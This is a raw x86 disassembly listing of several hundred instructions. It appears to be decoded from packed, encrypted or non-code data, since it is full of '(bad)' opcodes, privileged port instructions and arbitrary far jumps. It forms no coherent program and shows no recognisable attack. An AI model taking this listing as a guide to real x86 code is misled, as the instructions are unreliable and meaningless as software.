  4135f1:	mov    edi,0x439c2cef
  4135f6:	data16 stos BYTE PTR es:[edi],al
  4135f8:	jns    0x41359e
  4135fa:	mov    ?,WORD PTR [eax+0x6d]
  4135fd:	mov    al,ds:0xc58d61f1
  413602:	cwde   
  413603:	aad    0x99
  413605:	xor    BYTE PTR [eax],cl
  413607:	and    eax,0xdfe2d2b6
  41360c:	daa    
  41360d:	sub    eax,0xdec95ea7
  413612:	cmp    dl,BYTE PTR [esi]
  413614:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413615:	sub    eax,0x64785203
  41361a:	out    0x9b,al
  41361c:	ins    BYTE PTR es:[edi],dx
  41361d:	fs (bad) 
  41361f:	sti    
  413620:	cmp    al,0xa2
  413622:	sub    ah,cl
  413624:	inc    ebx
  413625:	out    dx,al
  413626:	sbb    al,0x3d
  413628:	mov    bh,0xd3
  41362a:	xor    al,0x30
  41362c:	mov    esi,0x786d631
  413631:	or     BYTE PTR [edi+0x3f],al
  413634:	xchg   ebp,eax
  413635:	cmp    eax,0xf26ab987
  41363a:	in     al,dx
  41363b:	push   ss
  41363c:	pop    ebx
  41363d:	jg     0x41367c
  41363f:	cmp    BYTE PTR [eax-0x6f03e4fc],dh
  413645:	or     edx,DWORD PTR [edx+0x58ca9dd6]
  41364b:	cli    
  41364c:	add    BYTE PTR es:[edx-0x3971380b],bh
  413653:	cli    
  413654:	xchg   BYTE PTR [eax+0x502a287],bh
  41365a:	mov    al,0xf7
  41365c:	push   ds
  41365d:	mov    BYTE PTR [edx+0x63],al
  413660:	out    dx,al
  413661:	mov    ds:0x34be53e6,eax
  413666:	pop    esp
  413667:	and    BYTE PTR [ebx-0x58],0x68
  41366b:	(bad)  
  41366c:	vpunpckhwd ymm1,ymm4,ymm4
  413670:	sub    DWORD PTR [edi-0x2be7c98c],ebp
  413676:	xor    al,0x52
  413678:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413679:	rcr    DWORD PTR [edx],cl
  41367b:	cwde   
  41367c:	inc    edi
  41367d:	lea    esi,cs:[edx]
  413680:	clc    
  413681:	rcr    DWORD PTR ds:0xdf9d9881,cl
  413687:	fidiv  DWORD PTR [edi-0x46]
  41368a:	add    bl,dh
  41368c:	sbb    DWORD PTR ds:0xdf8bd3cf,edx
  413692:	stos   BYTE PTR es:[edi],al
  413693:	push   0xfffffff3
  413695:	pop    ecx
  413696:	inc    ebp
  413697:	ret    
  413698:	mov    ebx,0xbb770bac
  41369d:	and    eax,0x32c38c8c
  4136a2:	out    dx,al
  4136a3:	je     0x4136af
  4136a5:	test   esi,esp
  4136a7:	sbb    BYTE PTR [eax],ch
  4136a9:	idiv   ecx
  4136ab:	sbb    esi,ebp
  4136ad:	mov    gs,WORD PTR [ebp+esi*4-0x5a]
  4136b1:	retf   0x3f8f
  4136b4:	jno    0x413639
  4136b6:	pop    ecx
  4136b7:	add    ecx,DWORD PTR [edi]
  4136b9:	mov    ecx,0x8ef161ca
  4136be:	sti    
  4136bf:	fcom   QWORD PTR [ecx-0x35c29807]
  4136c5:	inc    esp
  4136c6:	sti    
  4136c7:	data16 mov bl,0x10
  4136ca:	test   al,0x4d
  4136cc:	cmp    BYTE PTR [ebp-0x56],cl
  4136cf:	push   0xe5f334c9
  4136d4:	(bad)  
  4136d5:	xor    BYTE PTR [eax+esi*4-0x111cb28],al
  4136dc:	add    BYTE PTR [eax+0x54],dl
  4136df:	(bad)  
  4136e0:	xor    esi,DWORD PTR [ebp+0x53]
  4136e3:	je     0x4136cb
  4136e5:	fbstp  TBYTE PTR [edx]
  4136e7:	test   BYTE PTR [ebp+edi*4-0x6],bl
  4136eb:	and    DWORD PTR [edx+0x5b],edx
  4136ee:	mov    eax,0xde7afc23
  4136f3:	push   edx
  4136f4:	jnp    0x413686
  4136f6:	mov    bl,0x90
  4136f8:	rcr    DWORD PTR [ecx+eax*1+0x7418ad09],cl
  4136ff:	shl    esp,1
  413701:	sub    esi,edi
  413703:	adc    eax,0x77c12f79
  413708:	push   0xffffffad
  41370a:	fidivr WORD PTR [ecx-0x1a4f6ab8]
  413710:	xchg   edx,eax
  413711:	and    bl,BYTE PTR [edx-0x7a]
  413714:	jbe    0x413703
  413716:	sahf   
  413717:	outs   dx,BYTE PTR ds:[esi]
  413718:	pop    ecx
  413719:	(bad)  
  41371a:	dec    edi
  41371b:	aam    0xd1
  41371d:	jmp    FWORD PTR [edi+0x3e9b9340]
  413723:	push   ss
  413724:	fdivp  st(2),st
  413726:	jno    0x413727
  413728:	xor    al,0x3c
  41372a:	jae    0x4136ac
  41372c:	sub    BYTE PTR [esi],ch
  41372e:	push   ecx
  41372f:	cmp    cl,cl
  413731:	addr16 push es
  413733:	pusha  
  413734:	out    0x46,al
  413736:	adc    al,0xb8
  413738:	dec    ecx
  413739:	mov    ch,0xe1
  41373b:	mov    ?,edx
  41373d:	add    eax,0x1707cee3
  413742:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413743:	pop    es
  413744:	inc    esp
  413745:	lea    eax,[esi]
  413747:	popa   
  413748:	jle    0x41379f
  41374a:	mov    dh,0x4
  41374c:	jbe    0x413740
  41374e:	and    eax,0xaeaf7ede
  413753:	(bad)  
  413754:	sbb    eax,0x54e8cf24
  413759:	push   cs
  41375a:	mov    eax,ds:0xd137e749
  41375f:	sub    ebx,DWORD PTR [edi-0x5cb220f0]
  413765:	cmp    ah,BYTE PTR [esi-0x48]
  413768:	add    ebx,edi
  41376a:	push   esp
  41376b:	inc    esp
  41376c:	sbb    ebx,ebx
  41376e:	sahf   
  41376f:	aad    0x2c
  413771:	das    
  413772:	mov    edi,0x8ea85e56
  413777:	add    ah,BYTE PTR [eax-0x55f14b22]
  41377d:	cmc    
  41377e:	inc    ecx
  41377f:	add    al,BYTE PTR [ecx]
  413781:	cdq    
  413782:	int3   
  413783:	xchg   edi,ebx
  413785:	jae    0x413755
  413787:	inc    ecx
  413788:	jg     0x4137da
  41378a:	aam    0x6c
  41378c:	adc    BYTE PTR [edx],bl
  41378e:	inc    esi
  41378f:	test   BYTE PTR [ebx-0x59],cl
  413792:	stc    
  413793:	add    BYTE PTR [ebx-0x3b],ah
  413796:	ins    BYTE PTR es:[edi],dx
  413797:	cmc    
  413798:	daa    
  413799:	jecxz  0x4137c3
  41379b:	sub    ebp,DWORD PTR [esi-0x22]
  41379e:	ins    DWORD PTR es:[edi],dx
  41379f:	ror    DWORD PTR [edx-0x2d51bf53],0xfa
  4137a6:	mov    ebp,0x1c535d84
  4137ab:	hlt    
  4137ac:	dec    edi
  4137ad:	ret    
  4137ae:	sbb    dl,0x19
  4137b1:	into   
  4137b2:	add    BYTE PTR ds:0xa876239b,bh
  4137b8:	arpl   cx,sp
  4137ba:	lods   al,BYTE PTR ds:[esi]
  4137bb:	mov    ecx,0x2ee68099
  4137c0:	std    
  4137c1:	test   eax,0x2b71c46a
  4137c6:	dec    edi
  4137c7:	je     0x41379c
  4137c9:	fsubr  st(7),st
  4137cb:	and    al,0x1
  4137cd:	(bad)  
  4137ce:	or     DWORD PTR [ebx-0x3400a252],0xffffff87
  4137d5:	aaa    
  4137d6:	sub    BYTE PTR ds:0x40250569,dh
  4137dc:	mov    al,BYTE PTR [esi+0x7d46d028]
  4137e2:	xchg   esp,eax
  4137e3:	mov    eax,ds:0xd4c3dfc1
  4137e8:	int3   
  4137e9:	adc    esi,DWORD PTR ds:0x8835d54d
  4137ef:	sub    ebp,edi
  4137f1:	sahf   
  4137f2:	and    ebx,DWORD PTR [ecx+0x5fbf0019]
  4137f8:	ja     0x413819
  4137fa:	rol    BYTE PTR [edi-0x50c29f0c],0x91
  413801:	daa    
  413802:	ss mov ebp,0x9633782c
  413808:	xchg   esp,eax
  413809:	or     al,BYTE PTR [eax]
  41380b:	sub    eax,0x6c712276
  413810:	ja     0x413856
  413812:	mov    dh,0x50
  413814:	(bad)  
  413815:	dec    eax
  413816:	(bad)  
  413817:	mov    bh,BYTE PTR [ebp+ecx*2+0x7f7df441]
  41381e:	sub    eax,0xf5e87e63
  413823:	pop    ds
  413824:	mov    ds:0x2106a568,eax
  413829:	retf   
  41382a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41382b:	in     eax,dx
  41382c:	(bad)  
  41382d:	sub    esp,ebx
  41382f:	inc    edi
  413830:	cmp    BYTE PTR [esi+0x4d],ah
  413833:	inc    ebp
  413834:	and    BYTE PTR [edx],dl
  413836:	(bad)  
  413837:	cmp    dl,BYTE PTR [eax-0x76]
  41383a:	mov    WORD PTR [ebp+0x4608acd3],es
  413840:	in     al,dx
  413841:	mov    eax,ds:0xe437c8ce
  413846:	ror    BYTE PTR [ebx-0x2ef7872f],0xc
  41384d:	bnd jp 0x4138c5
  413850:	in     eax,0xa9
  413852:	imul   edx,DWORD PTR [esp+ebx*4],0x6d
  413856:	fldcw  WORD PTR [ebp+0x7faed5e1]
  41385c:	fcomip st,st(1)
  41385e:	scas   al,BYTE PTR es:[edi]
  41385f:	aad    0x23
  413861:	ins    BYTE PTR es:[edi],dx
  413862:	push   0xffffff80
  413864:	pop    ds
  413865:	icebp  
  413866:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413867:	ror    BYTE PTR [edx+0x7a],0x96
  41386b:	outs   dx,BYTE PTR es:[esi]
  41386d:	ins    DWORD PTR es:[edi],dx
  41386e:	cmp    BYTE PTR [ebx+0x7],dl
  413871:	mov    ebx,DWORD PTR [esi+edx*2]
  413874:	mov    ebp,0x609cabf1
  413879:	pop    eax
  41387a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41387b:	dec    esp
  41387c:	xchg   ecx,eax
  41387d:	jb     0x413846
  41387f:	xchg   DWORD PTR ds:0xf27f336a,ebx
  413885:	sbb    BYTE PTR [edx],dl
  413887:	pop    edi
  413888:	pop    ecx
  413889:	leave  
  41388a:	push   cs
  41388b:	sub    BYTE PTR [ebx+0x4],ah
  41388e:	push   edi
  41388f:	adc    DWORD PTR [edi+0x2cfdc165],edi
  413895:	push   eax
  413896:	push   ebx
  413897:	enter  0x5d08,0x9d
  41389b:	lods   al,BYTE PTR ds:[esi]
  41389c:	mov    ebp,0x4177379
  4138a1:	call   0xb1ccc361
  4138a6:	repz cs lahf 
  4138a9:	xchg   ecx,eax
  4138aa:	jl     0x413879
  4138ac:	mov    al,ds:0x41f04546
  4138b1:	mov    dl,0xc3
  4138b3:	stos   BYTE PTR es:[edi],al
  4138b4:	xchg   ecx,eax
  4138b5:	jl     0x413912
  4138b7:	mov    bh,BYTE PTR [esi]
  4138b9:	sti    
  4138ba:	test   BYTE PTR [edi+ecx*4],dh
  4138bd:	and    eax,0x1444d2ed
  4138c2:	jno    0x413936
  4138c4:	push   0xb
  4138c6:	mov    al,ds:0x32acf73a
  4138cb:	mov    ecx,0x93b109de
  4138d0:	push   ebx
  4138d1:	bound  ebx,QWORD PTR [ecx-0x43bc1394]
  4138d7:	and    ecx,DWORD PTR [esp+edi*8-0x3f]
  4138db:	jle    0x4138b7
  4138dd:	test   eax,0xb2208b6a
  4138e2:	adc    ebx,DWORD PTR [esi+0x3985d89c]
  4138e8:	push   cs
  4138e9:	and    esi,DWORD PTR [edx+0x13]
  4138ec:	cmp    ah,BYTE PTR [eax+0x123a9963]
  4138f2:	out    0x64,eax
  4138f4:	inc    edi
  4138f5:	sub    eax,0x6d78fd12
  4138fa:	ins    DWORD PTR es:[edi],dx
  4138fb:	js     0x4138c1
  4138fd:	cmp    DWORD PTR [eax-0x5a265ef6],edi
  413903:	mov    edx,edx
  413905:	add    ch,BYTE PTR [ecx]
  413907:	je     0x413927
  413909:	(bad)  
  41390a:	xor    dl,BYTE PTR [esi]
  41390c:	add    esp,edi
  41390e:	mov    esi,0x3f218541
  413913:	and    edx,DWORD PTR [ecx]
  413915:	lods   al,BYTE PTR ds:[esi]
  413916:	dec    edi
  413917:	xchg   ebx,eax
  413918:	ja     0x4138e5
  41391a:	jecxz  0x413998
  41391c:	mov    edx,0x1e17f22d
  413921:	aad    0xe8
  413923:	add    al,0xab
  413925:	ds daa 
  413927:	mov    eax,ds:0xa02635a5
  41392c:	fwait
  41392d:	adc    eax,0x635ebd4f
  413932:	daa    
  413933:	and    ebx,edi
  413935:	loopne 0x4138fb
  413937:	mov    ds:0x16913c52,eax
  41393c:	repnz or DWORD PTR [ebx+ebp*8+0x23],esp
  413941:	mov    al,ds:0x45016448
  413946:	fistp  QWORD PTR [edx+0x7c]
  413949:	loop   0x413984
  41394b:	mov    DWORD PTR [eax],edi
  41394d:	push   ebx
  41394e:	nop
  41394f:	pop    ds
  413950:	cmp    dl,0xc7
  413953:	bound  esp,QWORD PTR [ebp+0x13b9ee9]
  413959:	popf   
  41395a:	neg    DWORD PTR [esi+0x2cf3b69a]
  413960:	and    BYTE PTR [ebx],0xd
  413963:	pop    esi
  413964:	ins    DWORD PTR es:[edi],dx
  413965:	lods   eax,DWORD PTR ds:[esi]
  413966:	sub    al,0x99
  413968:	clc    
  413969:	nop
  41396a:	fmul   QWORD PTR [ecx-0x29f2de7f]
  413970:	cmp    eax,0x407fc7f5
  413975:	adc    eax,0xb48149a4
  41397a:	mov    eax,ds:0xdf3ac4e1
  41397f:	stos   DWORD PTR es:[edi],eax
  413980:	clc    
  413981:	adc    DWORD PTR [edx-0x2d3cabcc],esp
  413987:	data16 cld 
  413989:	pop    edi
  41398a:	pop    ss
  41398b:	fucomi st,st(7)
  41398d:	fist   DWORD PTR [esi-0x5ffa6c30]
  413993:	add    al,0x71
  413995:	das    
  413996:	cmp    al,0x15
  413998:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413999:	gs jge 0x413985
  41399c:	rcl    BYTE PTR [eax+ebp*2],cl
  41399f:	xchg   esi,eax
  4139a0:	xor    BYTE PTR [ebx-0x69],bl
  4139a3:	inc    ebx
  4139a4:	pop    edx
  4139a5:	xchg   ebp,ecx
  4139a7:	mov    edx,0x50e6cd1b
  4139ac:	pop    esi
  4139ad:	sub    bh,dl
  4139af:	loopne 0x413985
  4139b1:	adc    al,0x25
  4139b3:	or     DWORD PTR [ebp-0x68ecfe8e],esp
  4139b9:	sub    esi,DWORD PTR [esi-0x66]
  4139bc:	pop    esp
  4139bd:	enter  0x63e,0x32
  4139c1:	int    0x9e
  4139c3:	sti    
  4139c4:	inc    esi
  4139c5:	pop    es
  4139c6:	jb     0x41398f
  4139c8:	ret    
  4139c9:	mov    esi,0xd551510
  4139ce:	aam    0x40
  4139d0:	shl    ch,cl
  4139d2:	arpl   si,cx
  4139d4:	in     eax,0x88
  4139d6:	ins    BYTE PTR es:[edi],dx
  4139d7:	sub    DWORD PTR [edx-0x2cc5824e],ebx
  4139dd:	push   es
  4139de:	js     0x413a21
  4139e0:	xor    DWORD PTR [ebp+0x18f67cb9],0x7758bff8
  4139ea:	pop    edi
  4139eb:	push   ebp
  4139ec:	dec    ebp
  4139ed:	aaa    
  4139ee:	sbb    esp,ebp
  4139f0:	mov    dl,0x4b
  4139f2:	mov    ah,0xae
  4139f4:	jmp    0x2c78:0x12b64c15
  4139fb:	fs or  al,0x3a
  4139fe:	stos   BYTE PTR es:[edi],al
  4139ff:	add    eax,0xe184afc4
  413a04:	xor    eax,0xaae3bcc
  413a09:	pop    edx
  413a0a:	mov    ds:0xe9b7277f,eax
  413a0f:	xor    eax,0x2cf4ec81
  413a14:	and    DWORD PTR [edx],esp
  413a16:	bound  edx,QWORD PTR [edx]
  413a18:	pop    ss
  413a19:	dec    ecx
  413a1a:	rcr    BYTE PTR [si+0x611d],1
  413a1f:	pop    esi
  413a20:	add    ecx,DWORD PTR [eax]
  413a22:	(bad)  
  413a23:	xchg   edx,eax
  413a24:	mov    cl,0x47
  413a26:	add    ebp,DWORD PTR [edx-0x6067ee67]
  413a2c:	lods   al,BYTE PTR ds:[esi]
  413a2d:	cmc    
  413a2e:	inc    eax
  413a2f:	sbb    BYTE PTR [ebp-0x18],ah
  413a32:	out    dx,al
  413a33:	sub    BYTE PTR [edx-0xd1d8d97],dl
  413a39:	mov    ebp,0x7954c44a
  413a3e:	adc    al,0x46
  413a40:	or     eax,esp
  413a42:	xor    DWORD PTR ss:[edx+edi*4],0x9cf734fa
  413a4a:	data16 (bad) 
  413a4c:	jno    0x413a7a
  413a4e:	lods   eax,DWORD PTR ds:[esi]
  413a4f:	test   bh,0x65
  413a52:	jae    0x413ab6
  413a54:	sub    bl,BYTE PTR [esi+0x291b78d0]
  413a5a:	shl    DWORD PTR [edx+eiz*1],0x7d
  413a5e:	jp     0x4139f8
  413a60:	pop    edi
  413a61:	push   cs
  413a62:	jle    0x413a36
  413a64:	xchg   DWORD PTR [edx-0x1e],ecx
  413a67:	sub    eax,0xafda5745
  413a6c:	cmp    BYTE PTR [eax-0x62],0x62
  413a70:	pop    ss
  413a71:	add    edi,esp
  413a73:	mov    fs,WORD PTR [edx]
  413a75:	xor    DWORD PTR ds:0x8e290283,esp
  413a7b:	inc    ebx
  413a7c:	icebp  
  413a7d:	mov    al,ds:0x7f5cfef6
  413a82:	xchg   ecx,eax
  413a83:	mov    DWORD PTR [ebp-0xb6612f1],esp
  413a89:	sbb    al,0x95
  413a8b:	das    
  413a8c:	shl    DWORD PTR [edx+0x2792e26],1
  413a92:	adc    dl,BYTE PTR [edx+eiz*8-0x5c]
  413a96:	pop    edx
  413a97:	out    dx,al
  413a98:	mov    cl,0xa9
  413a9a:	add    BYTE PTR [edi],ah
  413a9c:	pusha  
  413a9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a9e:	ja     0x413ad7
  413aa0:	fdivr  QWORD PTR [ebx]
  413aa2:	dec    ebp
  413aa3:	imul   edi,DWORD PTR [ecx],0x29
  413aa6:	xchg   edx,eax
  413aa7:	cmp    eax,0xfe58a1f2
  413aac:	mov    al,dl
  413aae:	ins    BYTE PTR es:[edi],dx
  413aaf:	xor    edi,DWORD PTR [ebp+0x1d8ec41e]
  413ab5:	outs   dx,DWORD PTR ds:[esi]
  413ab6:	loopne 0x413aaf
  413ab8:	out    dx,eax
  413ab9:	dec    ebp
  413aba:	repz mov bl,0x35
  413abd:	mov    al,0x32
  413abf:	or     bh,bh
  413ac1:	mov    esp,0xe682ffd1
  413ac6:	ficom  DWORD PTR [ebp-0x28892b11]
  413acd:	inc    edx
  413ace:	cwde   
  413acf:	push   edx
  413ad0:	inc    ecx
  413ad1:	jle    0x413ae9
  413ad3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ad4:	loop   0x413ad4
  413ad6:	fdivr  DWORD PTR [ebx+edi*2+0x20]
  413ada:	into   
  413adb:	mov    bl,cl
  413add:	ins    DWORD PTR es:[edi],dx
  413ade:	jmp    0xabf9:0xfc00c87b
  413ae5:	dec    edi
  413ae6:	mov    ah,0xf7
  413ae8:	mov    edi,0x39f44644
  413aed:	shl    BYTE PTR [edi],cl
  413aef:	inc    eax
  413af0:	pop    esi
  413af1:	imul   eax,DWORD PTR [esi+0x44],0xa39fb509
  413af8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413af9:	iret   
  413afa:	fs mov edi,0x3422241d
  413b00:	in     eax,dx
  413b01:	out    dx,eax
  413b02:	pop    esp
  413b03:	fmul   DWORD PTR [edi+eax*1-0x3e]
  413b07:	or     bl,BYTE PTR [ebx-0x405f305d]
  413b0d:	loopne 0x413a9c
  413b0f:	lock out 0x7a,eax
  413b12:	(bad)  
  413b13:	aas    
  413b14:	xchg   edi,eax
  413b15:	in     al,dx
  413b16:	pop    edi
  413b17:	push   edx
  413b18:	rcl    BYTE PTR [edx+ecx*4],cl
  413b1b:	and    ecx,DWORD PTR [esi+0x59]
  413b1e:	jb     0x413ac8
  413b20:	xchg   esi,eax
  413b21:	sub    DWORD PTR [edi+0x56c4dc5e],esi
  413b27:	add    BYTE PTR [ebx+ebx*4+0x3c4c9ab2],al
  413b2e:	enter  0xc269,0x5c
  413b32:	pop    eax
  413b33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b34:	pop    ecx
  413b35:	sbb    cl,BYTE PTR [esi+0x4cf26d41]
  413b3b:	fldenv [esi-0x70]
  413b3e:	pop    ss
  413b3f:	or     al,0x80
  413b41:	jo     0x413b6d
  413b43:	jnp    0x413b1b
  413b45:	popa   
  413b46:	aad    0xfe
  413b48:	adc    bl,BYTE PTR [ebx]
  413b4a:	mov    edi,0xf0eb2ba9
  413b4f:	mov    ds:0xdfe3b5d4,eax
  413b54:	push   0xfffffff3
  413b56:	inc    edx
  413b57:	push   0xffffffc5
  413b59:	jno    0x413b32
  413b5b:	adc    BYTE PTR [eax],bl
  413b5d:	xchg   esp,eax
  413b5e:	leave  
  413b5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b60:	not    DWORD PTR [eax-0x376f35e3]
  413b66:	and    ah,BYTE PTR [ebx+edx*2]
  413b69:	push   0x7ac85c97
  413b6e:	sbb    eax,0xd9336aba
  413b73:	sbb    eax,0x35396b38
  413b78:	loope  0x413b54
  413b7a:	daa    
  413b7b:	int3   
  413b7c:	aaa    
  413b7d:	push   ebx
  413b7e:	or     dh,BYTE PTR [ecx-0xb9d162]
  413b84:	add    esp,DWORD PTR [ecx-0x259560c]
  413b8a:	lock or eax,0x3ad67658
  413b90:	test   DWORD PTR gs:[edx-0x3e],esp
  413b94:	add    esi,0xf8942759
  413b9a:	pop    ds
  413b9b:	mov    bh,0x30
  413b9d:	fwait
  413b9e:	mov    bh,0x84
  413ba0:	jae    0x413b2b
  413ba2:	daa    
  413ba3:	push   es
  413ba4:	dec    eax
  413ba5:	lea    eax,[eax]
  413ba7:	punpckhbw mm7,QWORD PTR [edx-0x2326a49b]
  413bae:	(bad)  ds:0x7b25290a
  413bb4:	(bad)  
  413bb5:	ds xchg esi,eax
  413bb7:	mov    BYTE PTR [ecx],al
  413bb9:	pop    esp
  413bba:	(bad)  
  413bbb:	jmp    FWORD PTR [esi-0x66d4a924]
  413bc1:	inc    edi
  413bc3:	cmp    edi,ebp
  413bc5:	inc    eax
  413bc6:	mov    dl,0xd0
  413bc8:	mov    edx,DWORD PTR [ebx-0x7b6f4066]
  413bce:	(bad)  
  413bd0:	ret    0x8fd1
  413bd3:	mov    DWORD PTR [ebx+0x20],ebx
  413bd6:	mov    ebp,0x2bde69c3
  413bdb:	ffree  st(6)
  413bdd:	stos   DWORD PTR es:[edi],eax
  413bde:	les    edi,FWORD PTR [ecx-0x62]
  413be1:	es test al,0xe
  413be4:	fsubp  st(4),st
  413be6:	(bad)  
  413be8:	pop    ds
  413be9:	ins    BYTE PTR es:[edi],dx
  413bea:	scas   al,BYTE PTR es:[edi]
  413beb:	loop   0x413bf0
  413bed:	out    dx,eax
  413bee:	jg     0x413bf6
  413bf0:	or     BYTE PTR [ebx],bh
  413bf2:	fwait
  413bf3:	out    dx,eax
  413bf4:	xor    DWORD PTR [ebp+0x5ef7907],ecx
  413bfa:	loop   0x413c56
  413bfc:	ds (bad) 
  413bff:	sub    bh,dl
  413c01:	inc    edx
  413c02:	mov    DWORD PTR [esi+0x5a],eax
  413c05:	ror    DWORD PTR [edi],0x7d
  413c08:	(bad)  
  413c09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c0a:	aam    0x2c
  413c0c:	jge    0x413c23
  413c0e:	stc    
  413c0f:	xlat   BYTE PTR ds:[ebx]
  413c10:	xchg   BYTE PTR [edi],al
  413c12:	pop    ebx
  413c13:	repz pop ebp
  413c15:	mov    edx,ds
  413c17:	or     al,0x5a
  413c19:	aam    0xfc
  413c1b:	je     0x413c98
  413c1d:	mov    al,ds:0x4d509993
  413c22:	clc    
  413c23:	dec    edi
  413c24:	mov    ebx,?
  413c26:	mov    al,0x97
  413c28:	pop    esp
  413c29:	hlt    
  413c2a:	les    esp,FWORD PTR [ecx+0x2c227446]
  413c30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c31:	push   ebp
  413c32:	push   0x32313972
  413c37:	fmul   DWORD PTR [ecx]
  413c39:	inc    ebp
  413c3a:	ror    edi,0x34
  413c3d:	or     edx,0x36
  413c40:	pop    es
  413c41:	jbe    0x413c0c
  413c43:	fild   QWORD PTR [eax+esi*4+0x7afa185d]
  413c4a:	jl     0x413c27
  413c4c:	sub    dh,BYTE PTR [edx]
  413c4e:	loopne 0x413cb2
  413c50:	add    eax,0xc8d9b102
  413c55:	into   
  413c56:	mov    eax,0x33b52e1
  413c5b:	jmp    0x413cbe
  413c5d:	sub    BYTE PTR [eax+edx*1+0x1],cl
  413c61:	ror    BYTE PTR [edx+0x3d],cl
  413c64:	(bad)  
  413c65:	add    DWORD PTR [edx-0x4777c9f4],esi
  413c6b:	inc    eax
  413c6c:	out    0x42,eax
  413c6e:	add    DWORD PTR [ebx-0x1b676f11],edx
  413c74:	adc    eax,0xedfc8a74
  413c79:	mov    ebp,0xc577464d
  413c7e:	cs out 0xe7,eax
  413c81:	std    
  413c82:	mov    ecx,0x6b1b880d
  413c87:	inc    esi
  413c88:	daa    
  413c89:	in     eax,dx
  413c8a:	cmp    esp,DWORD PTR [eax]
  413c8c:	lock mov edx,0x852e517a
  413c92:	and    BYTE PTR [ebx+0x22],al
  413c95:	dec    edi
  413c96:	mov    eax,0x72a9b108
  413c9b:	addr16 jae 0x413c23
  413c9e:	(bad)
  413ca1:	xor    cl,bh
  413ca3:	cld    
  413ca4:	push   edx
  413ca5:	outs   dx,BYTE PTR ds:[esi]
  413ca6:	pop    ebx
  413ca7:	aam    0x28
  413ca9:	jp     0x413c32
  413cab:	fst    QWORD PTR [esi+0x2638c2ae]
  413cb1:	xchg   esi,eax
  413cb2:	xor    al,0xbe
  413cb4:	jbe    0x413cf5
  413cb6:	mov    esi,0x2728120e
  413cbb:	xchg   edx,eax
  413cbc:	mov    ds:0x88b78e07,al
  413cc1:	dec    esp
  413cc2:	mov    al,0xbb
  413cc4:	cmc    
  413cc5:	fs inc ebp
  413cc7:	xchg   edx,eax
  413cc8:	test   BYTE PTR [edx],0x60
  413ccb:	addr16 jp 0x413c9b
  413cce:	fst    DWORD PTR [ebx]
  413cd0:	jb     0x413c84
  413cd2:	add    eax,0x7a40bb88
  413cd7:	push   cs
  413cd8:	jmp    0x2883a8f9
  413cdd:	in     al,dx
  413cde:	mov    eax,0x31d56595
  413ce3:	in     al,0x72
  413ce5:	and    ch,BYTE PTR [eax]
  413ce7:	pusha  
  413ce8:	jnp    0x413c9b
  413cea:	fild   DWORD PTR [eax-0x3c]
  413ced:	pop    edx
  413cee:	loope  0x413d6b
  413cf0:	neg    DWORD PTR [ecx-0x39f89316]
  413cf6:	mov    BYTE PTR ds:0x5601fdf5,cl
  413cfc:	aas    
  413cfd:	(bad)  
  413cfe:	shl    BYTE PTR [eax-0x27],0x12
  413d02:	inc    ecx
  413d03:	(bad)  
  413d04:	jb     0x413d30
  413d06:	jb     0x413d4f
  413d08:	mov    gs,ebp
  413d0a:	cdq    
  413d0b:	loop   0x413d35
  413d0d:	clc    
  413d0e:	add    dl,BYTE PTR [edx]
  413d10:	adc    eax,0x4b72dcba
  413d15:	jl     0x413c97
  413d17:	mov    esi,0x3c566811
  413d1c:	dec    esi
  413d1d:	call   0x1b4f:0x5fa5e08a
  413d24:	push   es
  413d25:	mov    ds:0xda49a9b2,al
  413d2a:	and    bl,BYTE PTR [eax+0x29]
  413d2d:	push   cs
  413d2e:	mov    bh,0x8a
  413d30:	inc    edx
  413d31:	mov    dh,0xce
  413d33:	ja     0x413d02
  413d35:	(bad)  
  413d36:	mov    WORD PTR [ebp-0x1c8ae588],cs
  413d3c:	test   DWORD PTR [ebx],esi
  413d3e:	in     eax,0x7a
  413d40:	sbb    ah,cl
  413d42:	sahf   
  413d43:	and    eax,0x99db6c4d
  413d48:	dec    dl
  413d4a:	aad    0x75
  413d4c:	sbb    eax,0xdc9f8c38
  413d51:	mov    dl,0x68
  413d53:	add    DWORD PTR [edi+0x3e546bc6],edx
  413d59:	les    ebp,FWORD PTR ds:0x3b96a38b
  413d5f:	sbb    al,0x3d
  413d61:	(bad)  
  413d62:	or     bl,ch
  413d64:	mov    esi,0x2546f33a
  413d69:	imul   esp,DWORD PTR [esi-0x52c4106a],0x202d166c
  413d73:	push   edx
  413d74:	xchg   ebx,eax
  413d75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d76:	mov    dh,0x87
  413d78:	scas   eax,DWORD PTR es:[edi]
  413d79:	mov    esi,0xb9a36e7d
  413d7e:	or     BYTE PTR [ecx+0x6a1e8ec6],0x9
  413d85:	adc    BYTE PTR [ebx],bh
  413d87:	jle    0x413d4f
  413d89:	xor    ebp,eax
  413d8b:	pop    ss
  413d8c:	sbb    ch,0x21
  413d8f:	inc    edi
  413d90:	or     DWORD PTR [ebp+ebp*4+0x7d],ebp
  413d94:	mov    ch,dh
  413d96:	jg     0x413db5
  413d98:	jmp    0xd9fb:0x228cb90d
  413d9f:	jmp    0x413d48
  413da1:	pop    ds
  413da2:	cmp    eax,0x5dafd3ff
  413da7:	pushf  
  413da8:	jl     0x413dae
  413daa:	and    al,BYTE PTR ds:0x40c00602
  413db0:	pushf  
  413db1:	aam    0x6c
  413db3:	je     0x413dda
  413db5:	int3   
  413db6:	xor    esp,eax
  413db8:	fcmove st,st(3)
  413dba:	mov    esi,0x9f836d21
  413dbf:	add    eax,0xe5cfa31d
  413dc4:	rol    eax,1
  413dc6:	js     0x413d9b
  413dc8:	fwait
  413dc9:	mov    dl,BYTE PTR [edi-0x2cf8d87]
  413dcf:	out    dx,al
  413dd0:	add    ebx,DWORD PTR [esi-0x1e55ce50]
  413dd6:	pop    ds
  413dd7:	dec    edx
